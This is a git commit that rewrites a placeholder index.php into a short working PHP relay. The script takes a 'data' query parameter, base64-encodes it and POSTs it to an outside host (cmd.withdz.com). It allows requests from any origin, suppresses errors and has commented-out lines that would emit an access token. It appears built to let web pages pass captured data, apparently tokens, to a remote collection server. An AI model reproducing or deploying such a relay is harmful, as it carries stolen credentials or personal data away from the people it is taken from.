9c9215f9b756ef1a4ef77b6dd97aa5bc757ef0ed
drive4dz <76058977+drive4dz@users.noreply.github.com>
2020-12-15 16:50:28 +0100

    Update index.php

--- index.php
+++ index.php
@@ -1,3 +1,56 @@
 <?php
-echo "<h2>PHP is Fun! 123</h2>";
+
+
+
+header("Access-Control-Allow-Origin: *");
+
+
+error_reporting(0);
+
+
+$data = $_GET['data'];
+
+$data = base64_encode($data);
+
+echo "$data **** ";
+
+
+
+
+$postdata = http_build_query(
+    array(
+        'data' => $data
+    )
+);
+
+
+
+$opts = array('http' =>
+    array(
+        'method'  => 'POST',
+        'header'  => 'Content-Type: application/x-www-form-urlencoded',
+        'content' => $postdata
+    )
+);
+
+
+$context  = stream_context_create($opts);
+
+
+$result = file_get_contents('http://cmd.withdz.com/ok/get.php', false, $context);
+
+echo $result;
+
+
+
+
+
+//header('Content-Type: application/javascript');
+
+//echo "var tok='$access_token';";
+
+
+
+
+
 ?>
